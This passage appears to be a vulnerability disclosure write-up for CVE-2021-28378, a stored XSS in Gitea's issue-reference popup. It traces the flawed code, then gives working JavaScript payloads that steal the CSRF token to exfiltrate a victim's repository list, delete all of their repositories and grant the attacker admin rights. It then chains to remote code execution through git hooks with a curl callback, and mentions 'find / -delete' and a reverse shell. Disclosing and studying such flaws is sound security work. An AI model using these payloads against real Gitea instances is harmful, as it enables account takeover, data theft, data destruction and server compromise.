    const [index, _issues, repo, owner] = $(this).attr('href').replace(/[#?].*$/, '').split('/').reverse();
    issuePopup(owner, repo, index, $(this));
  });
}

function issuePopup(owner, repo, index, $element) {
  $.get(`${AppSubUrl}/api/v1/repos/${owner}/${repo}/issues/${index}`, (issue) => {
...
    for (let i = 0; i < issue.labels.length; i++) {
...
      labels += `<div class="ui label" style="color: ${color}; background-color:#${label.color};">${label.name}</div>`;
    }
...

    $element.popup({
      variation: 'wide',
      delay: {
        show: 250
      },
      html: `
<div>
  <p><small>${issue.repository.full_name} on ${createdAt}</small></p>
  <p><span class="${color}">${svg(octicon, 16)}</span> <strong>${issue.title}</strong> #${index}</p>
  <p>${body}</p>
  ${labels}
</div>
`
    });
  });
}
```

What we see there is that for each node with the class `ref-issue`, we will add a vulnerable popup.
Now, we need to find where a `ref-issue` is sent to the user: let's grep (and keep only interesting results, so not any test files or similar ones) !
The following commit number corresponds to the 1.12.4 tag, the default version from the official `docker-compose.yml` file, which is affected by this CVE.

```
cd gitea
git checkout 8a51c48eb6367513e0518bcd412e64f6cbfe5e1a
grep -r ref-issue

modules/markup/html.go:		replaceContent(node, m[0], m[1], createLink(link, id, "ref-issue"))
modules/markup/html.go:		replaceContent(node, m[0], m[1], createLink(link, orgRepoID, "ref-issue"))
modules/markup/html.go:		link = createLink(com.Expand(ctx.metas["format"], ctx.metas), reftext, "ref-issue")
modules/markup/html.go:			link = createLink(util.URLJoin(setting.AppURL, ctx.metas["user"], ctx.metas["repo"], path, ref.Issue), reftext, "ref-issue")
modules/markup/html.go:			link = createLink(util.URLJoin(setting.AppURL, ref.Owner, ref.Name, path, ref.Issue), reftext, "ref-issue")
modules/markup/sanitizer.go:	sanitizer.policy.AllowAttrs("class").Matching(regexp.MustCompile(`ref-issue`)).OnElements("a")
```

We now know there is no static content with the class `ref-issue`, but it's dynamically generated.
The last is not interesting while it's just a sanitizer policy rule. The others are interesting, we'll see why.

Let's dive into `modules/markup/html.go`.

```
func fullIssuePatternProcessor(ctx *postProcessCtx, node *html.Node) {
	if ctx.metas == nil {
		return
	}
	m := getIssueFullPattern().FindStringSubmatchIndex(node.Data)
	if m == nil {
		return
	}
	link := node.Data[m[0]:m[1]]
	id := "#" + node.Data[m[2]:m[3]]

	// extract repo and org name from matched link like
	// http://localhost:3000/gituser/myrepo/issues/1
	linkParts := strings.Split(path.Clean(link), "/")
	matchOrg := linkParts[len(linkParts)-4]
	matchRepo := linkParts[len(linkParts)-3]

	if matchOrg == ctx.metas["user"] && matchRepo == ctx.metas["repo"] {
		// TODO if m[4]:m[5] is not nil, then link is to a comment,
		// and we should indicate that in the text somehow
		replaceContent(node, m[0], m[1], createLink(link, id, "ref-issue"))

	} else {
		orgRepoID := matchOrg + "/" + matchRepo + id
		replaceContent(node, m[0], m[1], createLink(link, orgRepoID, "ref-issue"))
	}
}
```

We'll also need to understand what `getIssueFullPattern` does.

```
func getIssueFullPattern() *regexp.Regexp {
	if issueFullPattern == nil {
		appURL := setting.AppURL
		if len(appURL) > 0 && appURL[len(appURL)-1] != '/' {
			appURL += "/"
		}
		issueFullPattern = regexp.MustCompile(appURL +
			`\w+/\w+/(?:issues|pulls)/((?:\w{1,10}-)?[1-9][0-9]*)([\?|#]\S+.(\S+)?)?\b`)
	}
	return issueFullPattern
}
```

Let's sum up to understand what job is done there.

In `fullIssuePatternProcessor`, we first need to be sure that `ctx.metas` is not nil (what we assume being true while it's built by higher functions/methods in the stack trace).
Then we check if the node data matches a path like `http://mygitea.com/gituser/myrepo/issues/1`. If there is a match, we then replace it by a link.
If the link is about the same user and repo, replace it by the `#<issue_id>` pattern, else by `<user>/<repo>#<issue_id>`.
In those both cases, we have a `ref-issue` class that is added to generate the popup.

The other catch does kind of the same thing.

## Time to play !

Now we have the context, which is about replacing a link like `http://mygitea.com/gituser/myrepo/issues/1` by a shorter link, we can deduce where such job is achieved: in issues and PR, where you can add a label on and/or post a comment.

For this, let's assume you've got a repository with write permissions.

### Label

Go to your repository, and create a new label with a name containing arbitrary code (such as `<script>alert('label.name')</script>`).

### Issue

Go to your repository issues, and create a new issue with arbitrary code in the title and the body, and add it the previous label.

### Let's execute some code

Create a new issue on any repository, and add in its body a link to your injected issue such as `http://mygitea.com/gituser/myrepo/issues/1`.
It will be replaced by the link we previously saw, and when someone will put his mouse over the link, the arbitrary code will get run: a popup is displayed embedding `label.name`.

## Exploit-time

The CVE-2021-28378 is proven being able to enable arbitrary code injection.
Let's imagine what an attacker could do.

On Gitea, you have a CSRF token which asserts your identity when filling forms and/or calling the API, preventing security issues like embedding a Gitea iframe to steal your accesses.
The CSRF token stored in your cookies (`_csrf`), but also in pretty much all the webpages (except some like `/api/v1/swagger`) a user visits under some fields... And so on the issues/PR webpages.
The most interesting field containing it is inside the common header part of the HTML pages, always with the same XPath: `/html/head/meta[9]`.

With this data, we can now send authenticated actions from any user affected by our payload, by simply getting the CSRF token in JS, with the following: `(document.evaluate("/html/head/meta[9]", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue).content`.

Now, it's time to use your creativity to build various attacks.
Notice you'll be limited in your actions, but not that much:

* the `label.name` and `issue.title` must be short, and so not many payloads will fit. Nevertheless, you can inject a `script` with a `src` attribute that will reference any script you want.
* the `body` is not limited in length, but the preview of the popup doesn't load so much data. Your payload will have to be at the beginning if you want it to get triggered. Nevertheless, you can do as specified previously with a `script` and a `src` attribute.

Let's have a look at some examples you can build.

### Get all the repositories of a user

Imagine the scenario where an attacker wants to get all the repositories you have access to. It proves the attack can break all your confidentiality.
This attack is achieved in 3 steps:

* steal the CSRF token ;
* get the list of the repositories ;
* create a new ticket with the raw JSON content of the previous step.

Let's write some JS code to do this:

```
var AppURL = "http://mygitea.com";
var HackerRepo = "/hacker/mysaferepo"

var CSRF = (document.evaluate("/html/head/meta[9]", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue).content;

var xhrGet = new XMLHttpRequest();
xhrGet.open("GET", AppURL + "/api/v1/repos/search", true);
xhrGet.onload = function() {
    if (xhrGet.readyState === XMLHttpRequest.DONE) {
        var xhrPost = new XMLHttpRequest();
        xhrPost.open("POST", AppURL + HackerRepo + "/issues/new", true);
        xhrPost.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhrPost.send("_csrf=" + CSRF + "&title=Title&content=" + xhrGet.responseText);
    }
}
xhrGet.send(null);
```

Put this payload in its own file, upload it on your repo and inject it in an issue body using something like `<script src="http://mygitea.com/hacker/mysaferepo/raw/branch/master/exploit.js"></script>`.

Now the attacker can comment an issue/PR referencing this injected issue, and when someone put his mouse over the link, he's got all his repositories data stolen by the attacker !

### Delete all the repositories a user has access to

Imagine the scenario where an attacker wants to delete all your repositories you have access to. It proves the attack can break all your integrity.
This attack is achieved in 3 steps:

* steal the CSRF token ;
* get the list of the repositories ;
* for each repository, delete it (at least try).

Let's write some JS code to do this:

```
var AppURL = "http://mygitea.com";

var CSRF = (document.evaluate("/html/head/meta[9]", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue).content;

var xhrGet = new XMLHttpRequest();
xhrGet.responseType = "json";
xhrGet.open("GET", AppURL + "/api/v1/repos/search", true);
xhrGet.onload = function() {
    if (xhrGet.readyState === XMLHttpRequest.DONE) {
        data = xhrGet.response.data;
        data.forEach(repo => {
            var xhrPost = new XMLHttpRequest();
            xhrPost.open("POST", repo.html_url + "/settings", true);
            xhrPost.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhrPost.send("_csrf=" + CSRF + "&action=delete&repo_name=" + repo.name)
        });
    }
}
xhrGet.send(null);
```

Put this payload in its own file, upload it on your repo and inject it in an issue body using something like `<script src="http://mygitea.com/hacker/mysaferepo/raw/branch/master/exploit.js"></script>`.

Now the attacker can comment an issue/PR referencing this injected issue, and when someone put his mouse over the reference, all the repositories he has access to gets deleted !

### Get the admin rights

Imagine the scenario where an attacker wants to get the admin rights. This proves a Privilege Escalation is possible.
This attack is achieved in 2 steps:

* steal the CSRF token ;
* give admin rights to the attacker (at least try).

Let's write some JS code to do this:

```
var AppURL = "http://mygitea.com";
var HackerID = "1";
var HackerEmail = "hacker@example.com";

var CSRF = (document.evaluate("/html/head/meta[9]", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue).content;

var xhr = new XMLHttpRequest();
xhr.open("POST", AppURL + "/admin/users/" + HackerID);
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.send("_csrf=" + CSRF + "&login_type=0-0&login_name=&full_name=&email=" + encodeURIComponent(HackerEmail) + "&password=&website=&location=&max_repo_creation=-1&active=on&admin=on&allow_git_hook=on&allow_create_organization=on");
```

Notice the value of `login_type` can change according to your Gitea version and the way your instance handles login.

Put this payload in its own file, upload it on your repo and inject it in an issue body using something like `<script src="http://mygitea.com/hacker/mysaferepo/raw/branch/master/exploit.js"></script>`.

Now the attacker can comment an issue/PR referencing this injected issue, and when someone with enough rights puts his mouse over the reference, the attacker gets granted admin rights ! He can also assigne the issue to an admin, or create the issue on a repo an admin is watching (so he'll get a notification) to increase its chances.

### Get a RCE

The """funniest""" part with Gitea is that security considerations where not part of the process, by implementing git hooks. It's probably one of the worst idea you could implement.

Once you have admin rights, you can grant you the privilege to manage git hooks (what is achieved with the previous payload). Procede as the [Gitea Git Hooks Remote Code Execution Metasploit module](https://packetstormsecurity.com/files/162122/Gitea-Git-Hooks-Remote-Code-Execution.html) does:

* add your bash payload into the `post-receive` git-hook ;
* commit and push something, even if it's empty ;
* check the effect of the payload.

To make sure this RCE is valid, let's put the following, with a valid `id`.

```
#!/bin/bash

curl https://requestbin.net/r/<id>
```

In the RequestBin inspection panel, after we submit a file that triggers the `post-receive` git hook, we see that a request was achieved with a `User-Agent: curl/<version>` which proves it is a valid RCE.

Notice this functionnality implies that for every XSS that can get triggered by an admin, as long as there will be the `_csrf` value embeded in pretty much all the webpages, you can get a RCE on Gitea.

## How to prevent

Do your updates according to the CVE affected versions (refers to the an official report). At the time of writing: 1.12.0 to 1.13.4 (excluded).

## Notes

Here is a list of affected versions and their test status. Notice for 1.13.X versions, you'll have to add `DISABLE_GIT_HOOKS = false` in the `app.ini` file under section `[security]`, which could be located at `data/gitea/conf/app.ini`, depending on where your data folder is (for the `docker-compose.yml` file documented on [DockerHub](https://hub.docker.com/r/gitea/gitea), it'll in the same folder).

| Version | XSS | RCE |
| --- | --- | --- |
| 1.12.0 | ✅ | ✅ |
| 1.12.1 | ✅ | ✅ |
| 1.12.2 | ✅ | ✅ |
| 1.12.3 | ✅ | ✅ |

| Metric | Value | Explanation |
| --- | --- | --- |
| AV | AV:N | Uses HTTP to interact. |
| AC | AC:L | Only needs an issue (by default on Gitea it's really easy to file one because it's enabled to everyone) or a pull request. |
| PR | PR:L | In most contexts, needs an account to create an issue (by default, you can register new accounts). All the accounts can create an issue on a read-only repository, expect in case the repo has been configured to avoid issues (which is not the default setting and rarely modified). |
| UI | UI:R | An user or admin has to put his mouse over the infected link to triggers a payload. |
| S | S:C | With the RCE, you have access to the host machine and so everything on it (except in case Gitea has been perfectly isolated, what is not officially documented or even discussed, and cannot be proved being perfect). |
| C | C:H | Once you've got the admin rights, you can manage everything even if it has been configured private. You are able to steal database credentials, connect to it using the RCE and extract data. With the RCE, you can directly read the file system, where no authentication/authorization checks are achieved by Gitea. |
| I | I:H | Once you've got the admin rights, you can modify rights, visibility, change the repository code, even delete the repository. With the RCE, you're free to dive into everything and so impact the integrity of users, files... |
| A | A:H | Given the RCE, you can simply delete the whole file system with a `find / -delete`, causing a total loss of availability. |
| E | E:H | Given the python script `exploit.py`, you can completly run the attack from bare to a reverse shell. |
| RL | RL:O | Fixed by commit `<1e3c3388fb82235d9f3d63a0bad62ca3ff4682ab>`, merged into master and so into Gitea 1.13.4. |
| RC | RC:C | This report confirms and shows multiple exploits, from the XSS origin analysis to a RCE example and autonomous script. |
| MAV | MAV:N | Uses HTTP to interact, but with the RCE you can uses other protocols. |
| MAC | MAC:L | Once you've got a reverse shell using the RCE, you're free to play on the host. |
| MPR | MPR:L | Once you've got a reverse shell using the RCE, you have the rights inherited from the user that ran it. Considering that you are now in the server file system, you have access to pretty much everything on it, including secrets in case there are some (to connect to the DB, an AD or even a Drone CI) only by reading env variables or `data/gitea/conf/app.ini`. |
| MUI | MUI:N | Once you've got the RCE, you can implement a backdoor so no further user interaction will be needed, and the attacker account can be deleted to hide the tracks. |
| MS | MS:C | With the RCE and a reverse shell/backdoor, you are free to go on the host server, steal tokens to connect to other authorities...etc. |
| MC | MC:H | Given the RCE, you are free to play on the host server, and so on the whole Gitea instance and everything that is in its environment (file system, other authorities, processes...). |
| MI | MI:H | Given the RCE, you are free to play on the host server, and so on the whole Gitea instance and everything that is in its environment (file system, other authorities, processes...). |
| MA | MA:H | Given the RCE, you are free to play on the host server, and so on the whole Gitea instance and everything that is in its environment (file system, other authorities, processes...). |
| CR | CR:H | Given the RCE, you are free to play on the host server. Even if it's a Docker container, Gitea doc does not explain how to isolate it, so it will be possible to affect host processes with the non-remapped PIDs, there is no seccomp so you can change Gitea source code easily, no quota so you can DoS the host server, no capabilities list is set so you can do every Docker call you want... |
| IR | IR:H | Given the RCE, you are free to play on the host server. Even if it's a Docker container, Gitea doc does not explain how to isolate it, so it will be possible to affect host processes with the non-remapped PIDs, there is no seccomp so you can change Gitea source code easily, no quota so you can DoS the host server, no capabilities list is set so you can do every Docker call you want... |
| AR | AR:M | Given the RCE, you are free to play on the host server. Even if it's a Docker container, Gitea doc does not explain how to isolate it, so it will be possible to affect host processes with the non-remapped PIDs, there is no seccomp so you can change Gitea source code easily, no quota so you can DoS the host server, no capabilities list is set so you can do every Docker call you want... While you don't host customer/internal services directly on the Gitea instance, you won't catastrophically affect them, but you'll be able to stop their business to get updated. With a bit of luck, in case you are delivering from Gitea with the Git hooks you can still dramatically stop their business from running. |
